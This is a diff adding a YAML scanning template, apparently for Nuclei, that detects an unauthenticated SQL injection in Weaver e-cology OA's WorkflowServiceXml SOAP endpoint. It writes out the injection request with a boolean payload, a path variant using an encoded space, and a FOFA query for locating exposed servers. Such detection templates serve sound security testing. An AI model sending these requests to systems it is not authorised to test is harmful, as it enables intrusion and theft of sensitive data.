@@ -1,0 +1,55 @@
+id: weaver-ecology-workflowservicexml-sqli
+
+info:
+  name: 泛微 OA E-Cology WorkflowServiceXml - sqli
+  author: yuxiang.cai
+  severity: high
+  description: Weaver e-cology OA WorkflowServiceXml接口存在SQL注入漏洞，未经身份验证的远程攻击者可以利用SQL注入漏洞获取敏感信息。
+  metadata:
+    verified: true
+    fofa-query: app="泛微-OA（e-cology）"
+    tips:
+    repair: 目前官方已发布安全补丁，建议受影响用户升级至最新版本：泛微e-cology 9 >= 10.64.1 https://www.weaver.com.cn/cs/securityDownload.html
+  tags: weaver, ecology, oa, sqli
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> 
+          <soapenv:Header/>
+          <soapenv:Body>
+            <web:getHendledWorkflowRequestList>
+              <web:in0>1</web:in0>
+              <web:in1>1</web:in1>
+              <web:in2>1</web:in2>
+              <web:in3>1</web:in3>
+              <web:in4>
+                <web:string>1=1 AND 5615=5615</web:string>
+              </web:in4>
+            </web:getHendledWorkflowRequestList>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    
+    payloads:
+      path:
+        - '/services/WorkflowServiceXml'
+        - '/services%20/WorkflowServiceXml'
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - 'lastOperatorName'
+          - 'lastOperateTime'
+          - 'receiveTime'
+        condition: and
